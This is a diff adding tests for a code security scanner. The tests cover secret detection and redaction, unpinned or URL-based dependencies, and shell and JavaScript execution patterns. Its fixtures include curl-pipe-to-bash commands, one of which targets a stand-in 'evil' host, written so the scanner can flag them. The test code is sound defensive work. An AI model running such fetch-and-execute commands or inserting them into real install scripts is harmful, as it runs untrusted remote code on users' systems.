@@ -169,6 +169,62 @@ def test_github_url_argument_injection_rejected():
         assert "must be an https" in result.stdout
 
 
+def _scan_dir(tmp: Path) -> dict:
+    out = tmp / "r.json"
+    result = subprocess.run(
+        [sys.executable, str(Path(__file__).parent.parent / "scanner.py"),
+         "--path", str(tmp), "--output", str(out)],
+        capture_output=True, text=True
+    )
+    assert result.returncode == 0, result.stderr
+    return json.loads(out.read_text())
+
+
+def test_secret_detection_and_redaction():
+    """Provider secrets are flagged, and their values are never written to the report."""
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        (tmp / "conf.py").write_text(
+            'AWS = "AKIAIOSFODNN7EXAMPLE"\n'
+            'GH = "ghp_' + "a" * 36 + '"\n'
+            'password = "hunter2hunter2"\n'
+        )
+        report = _scan_dir(tmp)
+        secrets = [f for f in report["findings"] if f["type"] == "hardcoded_secret"]
+        rule_ids = {f["rule_id"] for f in secrets}
+        assert "SEC-AWS-KEY" in rule_ids
+        assert "SEC-GITHUB-TOKEN" in rule_ids
+        # The actual secret values must not appear anywhere in the report.
+        raw = (tmp / "r.json").read_text()
+        assert "AKIAIOSFODNN7EXAMPLE" not in raw
+        assert "hunter2hunter2" not in raw
+        assert ("ghp_" + "a" * 36) not in raw
+
+
+def test_supply_chain_requirements_and_dockerfile():
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        (tmp / "requirements.txt").write_text("requests==2.31.0\nflask\ngit+https://github.com/x/y\n")
+        (tmp / "Dockerfile").write_text("FROM python:3.11\nRUN curl http://x | bash\n")
+        report = _scan_dir(tmp)
+        sc = {f["rule_id"] for f in report["findings"] if f["type"] == "supply_chain_risk"}
+        assert "SC-REQ-UNPINNED" in sc      # flask
+        assert "SC-REQ-URL" in sc            # git+https
+        assert "SC-DOCKER-PIPE" in sc        # curl | bash
+
+
+def test_multilanguage_shell_and_js():
+    with tempfile.TemporaryDirectory() as tmp:
+        tmp = Path(tmp)
+        (tmp / "install.sh").write_text("#!/bin/bash\ncurl http://evil | sudo bash\n")
+        (tmp / "tool.js").write_text('const cp = require("child_process");\ncp.execSync(x);\n')
+        report = _scan_dir(tmp)
+        ids = {f.get("rule_id") for f in report["findings"]}
+        assert "SH-PIPE-SHELL" in ids
+        assert "JS-CHILD-PROC" in ids
+        assert "JS-EXEC" in ids
+
+
 def test_symlinked_file_is_not_read():
     """A symlink in a scanned tree must not be followed (local file disclosure)."""
     with tempfile.TemporaryDirectory() as tmp:
